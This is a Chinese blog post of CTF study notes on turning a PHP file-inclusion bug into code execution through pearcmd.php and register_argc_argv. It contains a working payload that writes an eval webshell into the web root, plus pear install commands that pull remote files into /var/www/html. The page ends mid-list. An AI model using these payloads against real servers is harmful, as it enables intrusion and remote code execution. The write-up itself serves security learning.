<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="Pear命令读文件       12345678910111213141516 &lt;?php    error_reporting(0);    if(isset($_GET[&amp;#x27;file&amp;#x27;])) &amp;#123;        $file &#x3D; $_GET[&amp;#x27;file&amp;#x27;];                if(preg_">
<meta property="og:type" content="article">
<meta property="og:title" content="Pear命令读文件">
<meta property="og:url" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/index.html">
<meta property="og:site_name" content="晴川&#39;s Blog">
<meta property="og:description" content="Pear命令读文件       12345678910111213141516 &lt;?php    error_reporting(0);    if(isset($_GET[&amp;#x27;file&amp;#x27;])) &amp;#123;        $file &#x3D; $_GET[&amp;#x27;file&amp;#x27;];                if(preg_">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/image-20231017185626227.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082433.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082507.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082516.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082551.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082610.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082631.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082702.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082751.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082843.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082904.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082919.png">
<meta property="og:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/20210605082954.png">
<meta property="article:published_time" content="2023-10-17T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-12T09:23:11.902Z">
<meta property="article:author" content="Qingchuan">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan/1/hexoblog/source/image/image-20231017185626227.png"><title>Pear命令读文件 | 晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Pear命令读文件</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body">
        <h1 id="Pear命令读文件">
          <a href="#Pear命令读文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pear命令读文件" class="headerlink" title="Pear命令读文件"></a>Pear命令读文件</h1>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\image-20231017185626227.png"></p>
<blockquote>
<p> payload:+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=eval($_POST[1])?>+&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php </p>
</blockquote>
<pre><code>不同的系统pearcmd存放的位置好像不一定， 有的在/usr/share/php/pearcmd.php。

关于payload的解释： config-create是pearcmd.php的参数，用于创建默认配置文件。

这个命令需要两个参数，根路径和文件名。所以payload是利用该参数将&lt;?php eval($_POST[1])?&gt;写入到/var/www/html/a.php文件中。
</code></pre>

        <h1 id="registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合">
          <a href="#registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合" class="heading-link"><i class="fas fa-link"></i></a><a href="#registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合" class="headerlink" title="registerargcargv与include to RCE的巧妙组合[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv与include-to-rce的巧妙组合)"></a>register<em>argc</em>argv与include to RCE的巧妙组合[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#registerargcargv与include-to-rce的巧妙组合)</h1>
      <p>引子是巅峰极客2020的<strong>Meow World</strong>,题目总结下来只有一句话:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include $_GET[&#x27;f&#x27;].&quot;.php&quot;;</span><br></pre></td></tr></table></div></figure>

<p>真的是开局一个include,getshell全靠猜,比赛时提示register<em>argc</em>argv,但没做出来,赛后看了别人的wp和总结,自己也打算写一个小结.</p>

        <h2 id="registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv">
          <a href="#registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv" class="heading-link"><i class="fas fa-link"></i></a><a href="#registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv" class="headerlink" title="registerargcargv[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv)"></a>register<em>argc</em>argv[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#registerargcargv)</h2>
      <p>首先了解到这个参数默认是On的:</p>
<img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082433.png" style="zoom:75%;">

<p>但是经过后来测试发现但凡配置了php.ini的php里都会显示声明该参数为Off,那么这个参数是用来做什么的呢?</p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082507.png"></p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082516.png"></p>
<p>这里介绍了register<em>argc</em>argv的作用,当这个参数开启的时候,php会注册argc和argv这个全局变量,并且通过第二个图可知我们可以从$_SERVER[‘argv’] 中获取到这些值.</p>
<p>这里就要知道php作为一种脚本语言,当然可以用于编写命令行脚本,而我们可以在脚本中直接访问 argv ,argc 这两个全局变量.</p>
<p>这里实际测试下载register<em>argc</em>argv开启的情况下_SERVER[‘argv’]与argv的值:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">var_Dump($argv);</span><br></pre></td></tr></table></div></figure>

<p>网页端中:</p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082551.png"></p>
<p>命令行模式下:</p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082610.png"></p>
<p>而在register<em>argc</em>argv关闭的情况下,$_SERVER[‘argv’]不会拿到任何取值</p>

        <h2 id="pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear">
          <a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear" class="headerlink" title="pear[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear)"></a>pear[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#pear)</h2>
      <p>接下来就要介绍pear这个命令,简介如下:</p>

        <h3 id="pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1">
          <a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1" class="headerlink" title="pear[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear_1)"></a>pear[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#pear_1)</h3>
      <p>Pear 是 PHP 扩展与应用库（the PHP Extension and Application Repository）的缩写，是一个 PHP 扩展及应用的一个代码仓库。Pear 仓库代码是以包（package）分区，每一个 <code>Pear package</code> 都是一个独立的项目有着自己独立的开发团队、版本控制、文档和其他包的依赖关系信息。Pear package 以 phar、tar 或 zip 发布。</p>
<p>既然是个包管理器,那么就应该存在下载和安装包的功能,那么pear命令是如何实现的呢?</p>
<p>实际上pear命令是sh脚本,源码如下:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line"># first find which PHP binary to use</span><br><span class="line">if test &quot;x$PHP_PEAR_PHP_BIN&quot; != &quot;x&quot;; then</span><br><span class="line">  PHP=&quot;$PHP_PEAR_PHP_BIN&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/bin/php&quot; = &#x27;@&#x27;php_bin&#x27;@&#x27;; then</span><br><span class="line">    PHP=php</span><br><span class="line">  else</span><br><span class="line">    PHP=&quot;/usr/local/bin/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># then look for the right pear include dir</span><br><span class="line">if test &quot;x$PHP_PEAR_INSTALL_DIR&quot; != &quot;x&quot;; then</span><br><span class="line">  INCDIR=$PHP_PEAR_INSTALL_DIR</span><br><span class="line">  INCARG=&quot;-d include_path=$PHP_PEAR_INSTALL_DIR&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/lib/php&quot; = &#x27;@&#x27;php_dir&#x27;@&#x27;; then</span><br><span class="line">    INCDIR=`dirname $0`</span><br><span class="line">    INCARG=&quot;&quot;</span><br><span class="line">  else</span><br><span class="line">    INCDIR=&quot;/usr/local/lib/php&quot;</span><br><span class="line">    INCARG=&quot;-d include_path=/usr/local/lib/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=&quot;&quot; -d safe_mode=0 -d register_argc_argv=&quot;On&quot; -d auto_prepend_file=&quot;&quot; -d auto_append_file=&quot;&quot; $INCDIR/pearcmd.php &quot;$@&quot;</span><br></pre></td></tr></table></div></figure>

<p>通过看最后一行可以知道其实它是通过php调用了pearcmd.php,那么pearcmd.php中$argv是从哪里来的呢,通过简单查找可以看到其调用了另一个php文件中某个类方法:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require_once &#x27;Console/Getopt.php&#x27;;</span><br><span class="line">/* ... */</span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br></pre></td></tr></table></div></figure>

<p>再次跟进Console&#x2F;Getopt.php,找到该方法的实现:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        if (!is_array($argv)) &#123;</span><br><span class="line">            if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123;</span><br><span class="line">                if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123;</span><br><span class="line">                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;</span><br><span class="line">                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">            return $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        return $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到获取$argv的方式是<code>global $argv --&gt; $_SERVER[&#39;argv&#39;] --&gt; $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code></p>
<p>同时我们知道当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在register<em>argc</em>argv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER[‘argv’]来执行pear命令</p>

        <h3 id="pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载">
          <a href="#pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载" class="headerlink" title="pear命令任意文件下载[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear命令任意文件下载)"></a>pear命令任意文件下载[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#pear命令任意文件下载)</h3>
      <p>我们先来看看如何通过pear命令来实现任意文件下载:</p>
<ol>
<li><p>在目录下创建一个tmp.php<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082631.png"></p>
</li>
<li><p>使用python一句话开启http服务器:<code>python -m SimpleHTTPServer 8080</code></p>
</li>
<li><p>通过执行<code>pear</code>命令获取帮助,发现存在download选项,尝试执行<code>pear download http://127.0.0.1:8080/tmp.php</code>,可以看到已经成功在当前目录下载了tmp.php:<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082702.png"></p>
</li>
<li><p>有没有办法控制下载目录?答案是使用install -R而非download,尝试执行<code>pear install -R /var/www/html http://127.0.0.1:8080/tmp.php</code></p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082751.png"></p>
</li>
<li><p>成功下载到web目录下并能够访问<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082843.png"></p>
</li>
</ol>

        <h3 id="如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv">
          <a href="#如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv" class="heading-link"><i class="fas fa-link"></i></a><a href="#如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv" class="headerlink" title="如何控制$_SERVER[‘argv’][#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#如何控制_serverargv)"></a>如何控制$_SERVER[‘argv’][#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#如何控制_serverargv)</h3>
      <p>如何往$_SERVER[‘argv’]传入2个或以上的参数?测试一下:</p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082904.png"></p>
<p>并不能通过&amp;作为$_SERVER[‘argv’]的分割,通过查阅资料和阅读源码:</p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082919.png"></p>
<p>main&#x2F;php_variables.c  </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI void php_build_argv(const char *s, zval *track_vars_array)</span><br><span class="line">&#123;</span><br><span class="line">zval arr, argc, tmp;</span><br><span class="line">int count = 0;</span><br><span class="line">if (!(SG(request_info).argc || track_vars_array)) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">array_init(&amp;arr);</span><br><span class="line">/* Prepare argv */</span><br><span class="line">if (SG(request_info).argc) &#123; /* are we in cli sapi? */</span><br><span class="line">int i;</span><br><span class="line">for (i = 0; i &lt; SG(request_info).argc; i++) &#123;</span><br><span class="line">ZVAL_STRING(&amp;tmp, SG(request_info).argv[i]);</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (s &amp;&amp; *s) &#123;</span><br><span class="line">while (1) &#123;</span><br><span class="line">const char *space = strchr(s, &#x27;+&#x27;);</span><br><span class="line">/* auto-type */</span><br><span class="line">ZVAL_STRINGL(&amp;tmp, s, space ? space - s : strlen(s));</span><br><span class="line">count++;</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">if (!space) &#123;</span><br><span class="line">break;</span><br><span class="line">&#125; s</span><br><span class="line">= space + 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以知道argv通过query_string取值,并通过+作为分割符,尝试一下:</p>
<p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/AAwangzhan\1\hexoblog\source\image\20210605082954.png"></p>

        <h2 id="回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目">
          <a href="#回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目" class="headerlink" title="回到题目[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#回到题目)"></a>回到题目[#](<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> to RCE的巧妙组合&#x2F;#回到题目)</h2>
      <p>现在回到题目,我们所有的拼图已经凑齐了,假如存在以下环境:</p>
<ul>
<li>安装了pear</li>
